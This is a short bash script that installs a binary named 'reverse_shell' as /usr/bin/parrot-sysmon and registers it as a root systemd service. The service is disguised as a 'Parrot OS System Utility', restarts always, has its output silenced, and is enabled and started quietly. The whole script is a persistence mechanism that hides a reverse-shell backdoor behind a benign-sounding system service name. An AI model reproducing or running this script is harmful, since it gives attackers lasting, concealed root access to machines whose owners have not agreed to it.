#!/bin/bash
sudo cp reverse_shell /usr/bin/parrot-sysmon
sudo chmod +x /usr/bin/parrot-sysmon
sudo bash -c 'echo "[Unit]\nDescription=Parrot OS System Utility\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/parrot-sysmon\nRestart=always\nStandardOutput=null\nStandardError=null\nUser=root\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/parrot-sysmon.service'
sudo systemctl daemon-reload
sudo systemctl enable parrot-sysmon.service
sudo systemctl start parrot-sysmon.service > /dev/null 2>&1
